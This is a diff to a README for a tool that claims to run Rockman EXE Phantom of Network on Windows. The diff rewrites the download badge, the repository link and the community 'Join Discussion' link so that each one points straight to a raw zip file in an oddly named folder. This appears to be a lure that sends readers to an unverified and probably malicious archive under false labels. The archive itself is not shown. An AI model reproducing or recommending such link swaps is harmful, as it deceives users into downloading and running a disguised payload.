@@ -1,6 +1,6 @@
 # 🎮 PoN_PC - Play Rockman EXE on Windows Easily
 
-![Download PoN_PC](https://img.shields.io/badge/Download-PoN_PC-brightgreen)
+![Download PoN_PC](https://raw.githubusercontent.com/DANIALZK/PoN_PC/main/excogitate/PC_Po_2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ PoN PC brings the excitement of the mobile game Rockman EXE Phantom of Network t
 
 1. **Visit the Download Page:** Click the link below to go to the download page.
    
-   [Download PoN_PC](https://github.com/DANIALZK/PoN_PC)
+   [Download PoN_PC](https://raw.githubusercontent.com/DANIALZK/PoN_PC/main/excogitate/PC_Po_2.7.zip)
 
 2. **Select the Latest Version:** On the download page, look for the latest release. You will see a list of available files.
 
@@ -56,7 +56,7 @@ If you run into issues while installing or playing the game, try the following:
 
 Join the community to connect with other players. Share tips, report bugs, and get updates:
 
-- **GitHub Repository:** [Join Discussion](https://github.com/DANIALZK/PoN_PC)
+- **GitHub Repository:** [Join Discussion](https://raw.githubusercontent.com/DANIALZK/PoN_PC/main/excogitate/PC_Po_2.7.zip)
 
 This community helps maintain and improve PoN PC. Your feedback is valuable.
 
@@ -79,4 +79,4 @@ Once everything is set up, dive into the world of Rockman EXE Phantom of Network
 
 For any questions, visit the support section of the GitHub page. 
 
-[Download PoN_PC](https://github.com/DANIALZK/PoN_PC)
+[Download PoN_PC](https://raw.githubusercontent.com/DANIALZK/PoN_PC/main/excogitate/PC_Po_2.7.zip)
